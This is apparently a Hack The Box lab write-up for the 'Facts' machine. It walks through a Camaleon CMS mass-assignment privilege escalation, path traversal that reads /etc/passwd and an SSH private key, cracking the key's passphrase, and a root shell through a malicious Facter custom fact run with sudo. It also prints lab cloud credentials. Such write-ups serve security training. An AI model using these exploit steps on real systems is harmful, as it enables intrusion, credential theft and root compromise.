# Hack The Box - Facts Machine Walkthrough

![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square)
![OS-Linux](https://img.shields.io/badge/OS-Linux%20Ubuntu-orange?style=flat-square)
![CVE-2025-2304](https://img.shields.io/badge/CVE-2025--2304-red?style=flat-square)
![CVE-2024-46987](https://img.shields.io/badge/CVE-2024--46987-red?style=flat-square)
![Privilege-Escalation](https://img.shields.io/badge/Technique-Privilege%20Escalation-darkred?style=flat-square)
![RCE](https://img.shields.io/badge/Technique-RCE-darkred?style=flat-square)
![Status-Completed](https://img.shields.io/badge/Status-Completed-success?style=flat-square)

## 📋 Table of Contents
1. [Machine Information](#machine-information)
2. [Executive Summary](#executive-summary)
3. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4. [Phase 2: Web Enumeration](#phase-2-web-enumeration)
5. [Phase 3: Vulnerability Identification](#phase-3-vulnerability-identification)
6. [Phase 4: Exploitation - Admin Escalation](#phase-4-exploitation---admin-escalation)
7. [Phase 5: SSH Credentials Extraction](#phase-5-ssh-credentials-extraction)
8. [Phase 6: User Flag Acquisition](#phase-6-user-flag-acquisition)
9. [Phase 7: Root Escalation](#phase-7-root-escalation)
10. [Flags Obtained](#flags-obtained)
11. [Lessons Learned](#lessons-learned)
12. [References](#references)

---

## Machine Information

| Parameter | Value |
|-----------|-------|
| **Name** | Facts |
| **Difficulty** | Easy |
| **Operating System** | Ubuntu Linux |
| **Machine IP** | 10.129.17.110 |
| **Open Ports** | 22 (SSH), 80 (HTTP), 54321 (MinIO) |
| **Platform** | Hack The Box - Starting Point |
| **Total Time** | ~4-5 hours (including CVE research) |

---

## Executive Summary

**Facts** is classified as an "Easy" machine on HTB, but actually requires exploitation of **multiple chained vulnerabilities** and understanding of different pentesting techniques:

1. **CVE-2025-2304**: Privilege escalation via Mass Assignment in Camaleon CMS
2. **CVE-2024-46987**: Path Traversal for sensitive file access
3. **SSH Key Cracking**: Using John the Ripper to decrypt passphrase
4. **Sudo Misconfiguration**: Exploiting sudo permissions on `facter`
5. **Ruby Code Injection**: Custom facts in Facter for RCE as root

Key learnings from this machine:
- Importance of exhaustive enumeration
- How different backends process parameters differently
- Real-world privilege escalation flow
- Automation vs manual tools (curl vs scripts)

---

## Phase 1: Reconnaissance

### 1.1 VPN Setup

**Why?** Facts is on Starting Point, which uses a different VPN than the regular HTB lab VPN.

```bash
# Download ovpn file from HTB (Settings > VPN)
# In our case: machines_us-5.ovpn

sudo openvpn ~/Downloads/machines_us-5.ovpn
```

**Verification:**
```bash
ping 10.129.17.110
PING 10.129.17.110 (10.129.17.110): 56 data bytes
64 bytes from 10.129.17.110: icmp_seq=0 ttl=63 time=123.456 ms
```

✅ Successfully connected

### 1.2 Nmap Port Scan

**Why?** First reconnaissance step - identify running services.

```bash
nmap -sV -sC -p- 10.129.17.110
```

**Key Output:**
```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 9.9p1 Ubuntu
80/tcp    open  http       nginx 1.26.3
54321/tcp open  ftp?       Golang net/http server
```

**Analysis:**
- **Port 22 (SSH)**: Remote access, potential target after obtaining credentials
- **Port 80 (HTTP)**: Web application, likely primary attack vector
- **Port 54321**: Unknown service - later revealed to be **MinIO** (S3 storage)

**Decision:** Focus on port 80 (HTTP) as it's the most common attack vector for web machines.

### 1.3 Add Domain to /etc/hosts

Nmap showed port 80 redirects to a hostname. We added:

```bash
echo "10.129.17.110 facts.htb" | sudo tee -a /etc/hosts
```

**Why?** Without this entry, browsers/curl cannot resolve `facts.htb`.

---

## Phase 2: Web Enumeration

### 2.1 Initial HTTP Access

```bash
curl -L http://facts.htb/
```

**Discovery:** Application redirects to `http://facts.htb/` - a **facts/trivia page**.

### 2.2 CMS Identification

**How we discovered it:**

Looking at HTML source code:
```html
<!-- Footer reveals CMS -->
<footer>
  Powered by Camaleon CMS v2.9.0
</footer>
```

Also in asset paths:
```
/camaleon_cms/...
/assets/cmaleon/...
```

**Why is this important?** Specific CMS version = known CVEs available.

### 2.3 Endpoint Enumeration

```bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirbuster/common.txt
```

**Directories Found:**
```
/index           (200)
/search          (200)
/admin           (302 → /admin/login)
/admin/login     (200)
/rss             (200)
/sitemap         (200)
/robots          (200)
```

**Analysis:**
- `/admin` is accessible but requires authentication
- Application has standard CMS functionality

### 2.4 User Account Creation

**Decision:** Create an account to access the admin panel.

On `http://facts.htb/admin/login`, we found registration option:
- **Username:** pepe
- **Password:** pepe
- **Email:** pepepepo@pepe.com
- **Role:** Client (cannot choose Admin)

**Result:** Account successfully created with User ID: 5

---

## Phase 3: Vulnerability Identification

### 3.1 Camaleon CMS 2.9.0 Research

With specific version identified, we searched for CVEs:

```bash
# Manual search in CVE databases
searchsploit camaleon cms
```

**CVEs Found for 2.9.0:**

#### CVE-2024-46987 - Path Traversal
- **Endpoint:** `/admin/download_private_file?file=`
- **Description:** Allows reading server files using path traversal
- **Requirement:** Authentication
- **Problem:** Requires AWS S3 backend, didn't work in first attempt

#### CVE-2025-2304 - Mass Assignment (Privilege Escalation)
- **Endpoint:** `/admin/users/{id}/updated_ajax`
- **Description:** Mass assignment vulnerability allowing privilege escalation
- **Requirement:** Authentication as normal user
- **Impact:** Change user role to administrator

### 3.2 First Approach: Manual Curl

**Why curl first?**
- Quick to test
- Full control over headers and parameters
- Fewer dependencies

**First Attempt (FAILED):**
```bash
curl -X PATCH http://facts.htb/admin/users/5 \
  -d "user[role]=admin"
# Result: 422 Unprocessable Entity
```

**Why it failed?**
- Wrong endpoint: should be `/admin/users/5/updated_ajax`
- Missing specific headers
- No CSRF token included

**Second Attempt (FAILED):**
```bash
curl -X PATCH http://facts.htb/admin/users/5/updated_ajax \
  -b "_factsapp_session=..." \
  -H "X-CSRF-Token: ..." \
  -d "password[role]=admin"
# Result: "change rejected"
```

**Why it failed?**
- Missing header: `X-Requested-With: XMLHttpRequest`
- Missing `_method=patch` in data
- Didn't test parameter variants

---

## Phase 4: Exploitation - Admin Escalation

### 4.1 Discovery: PoC Script

**Critical Decision:** Stop trying manually, use automated exploit.

**Reasons:**
1. Script tests multiple parameter variants
2. Different backends process parameters differently
3. Manual curl is error-prone

### 4.2 Repository Cloning

```bash
cd ~/htb-facts
git clone https://github.com/d3vn0mi/CVE-2025-2304-POC.git
cd CVE-2025-2304-POC
ls -la
# File: cve-2025-2304.py
```

### 4.3 Exploit Execution

```bash
python3 cve-2025-2304.py http://facts.htb -u pepe -p pepe -v
```

**Successful Output:**
```
[+] EXPLOITATION SUCCESSFUL!
[+] Privilege Escalation: Client → Administrator
[+] Vulnerable Endpoint: /admin/users/5/updated_ajax
[+] Working Payload: {'password[role]': 'admin'}
[+] CVE-2025-2304 CONFIRMED!
```

**Why it worked:**

The script tested multiple variants:
```python
exploit_tests = [
    {'user[role]': 'admin'},      # Attempt 1 - FAILED
    {'password[role]': 'admin'},  # Attempt 2 - SUCCESS ✅
    {'role': 'admin'},
    {'user[admin]': 1}
]
```

The server accepted `password[role]=admin` because:
- Parameter was nested under `password`
- Endpoint designed for password change without proper parameter validation

**Lesson Learned:** Each backend (Rails in this case) processes Mass Assignment differently. Testing variants is crucial.

### 4.4 S3/MinIO Credentials Access

Now as admin, we accessed:
```
http://facts.htb/admin/settings/site
```

**Credentials Obtained:**
```
AWS s3 access key: AKIAD8DA2DB2B367A6B7
AWS s3 secret key: b2PvlML+WMPr2cQSpc5hveA5SZT855HFS/qT+HwO
AWS s3 bucket name: randomfacts
AWS s3 bucket endpoint: http://localhost:54321
```

---

## Phase 5: SSH Credentials Extraction

### 5.1 System User Enumeration

Using CVE-2024-46987 (Path Traversal):

```bash
cd ~/htb-facts
git clone https://github.com/Goultarde/CVE-2024-46987.git
cd CVE-2024-46987

python3 CVE-2024-46987.py /etc/passwd -u http://facts.htb -l pepe -p pepe -v
```

**Output - Users with Interactive Shell:**
```
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash    ✅ Can SSH
william:x:1001:1001::/home/william:/bin/bash           ✅ Can SSH
```

**Why this matters?**
- Users with `/bin/bash` can connect remotely
- Users with `/usr/sbin/nologin` cannot
- Gives us potential SSH targets

### 5.2 SSH Private Key Extraction

```bash
python3 CVE-2024-46987.py /home/trivia/.ssh/id_ed25519 \
  -u http://facts.htb -l pepe -p pepe -v > id_ed25519
```

**Verification:**
```bash
ls -la id_ed25519
# -rw-rw-r-- 1 kali kali 464 Apr  3 20:17 id_ed25519

head -1 id_ed25519
# -----BEGIN OPENSSH PRIVATE KEY-----
```

**Why id_ed25519 and not id_rsa?**
- Different cryptography algorithms
- Ed25519 is more modern and secure
- Server used this algorithm

### 5.3 SSH Key Decryption with John the Ripper

**Problem:** Key is encrypted with a passphrase.

```bash
# Convert to John hash format
ssh2john id_ed25519 > id_ed25519.hash

# Attempt crack with small dictionary (FAILED - too slow)
john id_ed25519.hash --wordlist=/usr/share/dict/words
# ETA: 21:46:57 (80+ minutes remaining)

# Download rockyou.txt (more complete dictionary)
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Crack with rockyou.txt (SUCCESS)
john id_ed25519.hash --wordlist=./rockyou.txt
```

**Result:**
```
dragonballz (id_ed25519)
Session completed.
```

**Why it worked?**
- rockyou.txt contains ~14 million words
- `dragonballz` is common in dictionary
- John the Ripper systematically tested each word
- Total time: ~2-3 minutes

**Lesson:** Dictionary selection is critical. `/usr/share/dict/words` is too small (~235K words).

### 5.4 SSH Permission Fixing

```bash
chmod 600 id_ed25519
```

**Why?** SSH rejects private keys with overly open permissions for security reasons.

---

## Phase 6: User Flag Acquisition

### 6.1 SSH Connection as trivia

```bash
ssh -i id_ed25519 trivia@facts.htb
```

**Prompt:**
```
Enter passphrase for key 'id_ed25519': dragonballz
```

**Successful Connection:**
```
Welcome to Ubuntu 25.04
trivia@facts:~$
```

### 6.2 Flag Search

```bash
# First attempt - search in home
ls -la ~/
# No user.txt

# Second attempt - search in /home
cd /home/william
ls -la
# -rw-r--r-- 1 root    william   33 Apr  3 18:56 user.txt

cat /home/william/user.txt
```

**Flag Captured:** ✅ User flag obtained




---

## Phase 7: Root Escalation

### 7.1 Sudo Permissions Enumeration

```bash
sudo -l
```

**Output:**
```
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

**Why this matters?**
- `NOPASSWD` = no password required
- `facter` = system information collection tool
- Executable as ANY user
- Likely vulnerable

### 7.2 Facter Investigation

```bash
facter --help
facter --version
# facter 4.10.0
```

**What is facter?**
- Puppet tool for collecting system "facts"
- Can load custom facts from directories
- Custom facts written in Ruby
- **Vulnerability:** If we control custom facts, we execute arbitrary code

### 7.3 Exploitation: Custom Ruby Fact

**Attack Plan:**
1. Create directory `/tmp/custom`
2. Write malicious Ruby fact executing `/bin/sh`
3. Execute `facter` with `--custom-dir=/tmp/custom`
4. Facter loads our malicious code as root

**Implementation:**

```bash
# Step 1: Create directory
mkdir -p /tmp/custom

# Step 2: Create malicious fact
cat > /tmp/custom/shell.rb << 'EOF'
Facter.add('shell') do
  setcode do
    exec('/bin/sh')
  end
end
EOF

# Step 3: Verify creation
ls -la /tmp/custom/
# -rw-rw-r--  1 trivia trivia  66 Apr  4 01:07 shell.rb

# Step 4: Execute exploit
sudo /usr/bin/facter --custom-dir=/tmp/custom
```

**Result:**
```
#
```

The `#` indicates we have a shell as **root** (uid=0).

**Why it worked?**
1. `facter` executes as root
2. `--custom-dir` flag tells facter where to find custom facts
3. Our `shell.rb` file is valid Ruby/Puppet code
4. `exec('/bin/sh')` replaces current process with a shell
5. Shell inherits root permissions

### 7.4 Root Flag Capture

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

**Flag Captured:** ✅ Root flag obtained

---

## Flags Obtained

| Flag | Location | Status |
|------|----------|--------|
| **User Flag** | `/home/william/user.txt` | ✅ Obtained |
| **Root Flag** | `/root/root.txt` | ✅ Obtained |

---

## Lessons Learned

### 1. **Exhaustive Enumeration is Critical**
- Discovered 3 different CVEs before finding correct path
- Reading `/etc/passwd` revealed interactive shell users
- Patience in enumeration pays off

### 2. **Different Backends = Different Parameter Processing**
- `user[role]=admin` did not work
- `password[role]=admin` worked perfectly
- Each framework (Rails) has own parameter parsing rules

### 3. **Automated Tools vs Manual Attempts**
- **Manual curl:** Fast but error-prone, requires detailed knowledge
- **Automated scripts:** Slower to create, but automatically tests variants
- **Lesson:** For known vulnerabilities, use existing tools

### 4. **CSRF Tokens Don't Last Forever**
- Get fresh tokens before each exploit
- Tokens expire with sessions
- Session cookies can also expire

### 5. **Dictionary Selection Matters for Cracking**
- `/usr/share/dict/words`: Too small (235K words)
- `rockyou.txt`: Appropriate (14M words)
- **Strategic decision:** Download better dictionary when first attempt is slow

### 6. **File Permissions Are Security Features**
- SSH requires `chmod 600` on private keys
- This is security, not an error
- Understanding why restrictions exist is important

### 7. **Real Privilege Escalation Flow:**
```
Anonymous web access 
  → Create account (client role)
  → Escalate to admin (Mass Assignment)
  → Read sensitive files (Path Traversal)
  → Obtain SSH credentials
  → SSH as normal user
  → Exploit sudo misconfiguration
  → RCE as root
```

### 8. **Scripting Languages in Privileged Contexts**
- Ruby in Facter allows code execution
- Privileged context (sudo, root) amplifies impact
- Always review scripting languages executing as root

---

## Timeline

| Phase | Time | Notes |
|-------|------|-------|
| VPN Setup & Nmap | 10 min | Initial reconnaissance |
| Web Enumeration | 20 min | Identify Camaleon CMS |
| CVE Research | 30 min | Found 2 applicable CVEs |
| Manual Curl & Debug | 45 min | Multiple failures, learning |
| PoC Script & Escalation | 15 min | CVE-2025-2304 successful |
| SSH Key Extraction & Crack | 60 min | ssh2john + John the Ripper |
| SSH Connection | 5 min | User flag obtained |
| Sudo Exploitation | 20 min | Facter RCE successful |
| **Total** | **~3 hours** | |

---

## Tools & Technologies Used

| Tool | Version | Purpose |
|------|---------|---------|
| nmap | 7.93 | Port scanning |
| curl | 8.18.0 | Manual HTTP requests |
| gobuster | Latest | Directory enumeration |
| Python | 3.11 | Running PoC exploits |
| ssh-keygen | OpenSSH | Key conversion |
| ssh2john | JohnTheRipper | Hash conversion |
| john | 1.9.0 | Password cracking |
| OpenVPN | 2.6 | VPN connection |

---

## External Resources

### Referenced CVEs
- [CVE-2025-2304: Camaleon CMS Mass Assignment](https://github.com/d3vn0mi/CVE-2025-2304-POC)
- [CVE-2024-46987: Camaleon CMS Path Traversal](https://github.com/Goultarde/CVE-2024-46987)

### Repositories Used
```bash
# CVE-2025-2304 Exploit
git clone https://github.com/d3vn0mi/CVE-2025-2304-POC.git

# CVE-2024-46987 Exploit
git clone https://github.com/Goultarde/CVE-2024-46987.git

# Wordlist for cracking
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

### Official Documentation
- [Camaleon CMS Documentation](https://camaleon.tuzitio.com/)
- [Puppet Facter Documentation](https://puppet.com/docs/facter/)
- [OWASP Mass Assignment](https://owasp.org/www-community/Mass_Assignment)

---

## Conclusion

Facts was an extremely educational machine despite being classified as "Easy". It required:

1. **Critical Thinking** in enumeration
2. **Adaptability** when initial attempts failed
3. **Knowledge of Multiple CVEs** and chaining them
4. **Specialized Tools** (John the Ripper, ssh2john)
5. **Security Concepts** (Mass Assignment, Path Traversal, Sudo Misconfiguration)



---

**Documented by:** Aspri  
**Date:** April 2026  
**Status:** ✅ COMPLETED (User Flag + Root Flag)
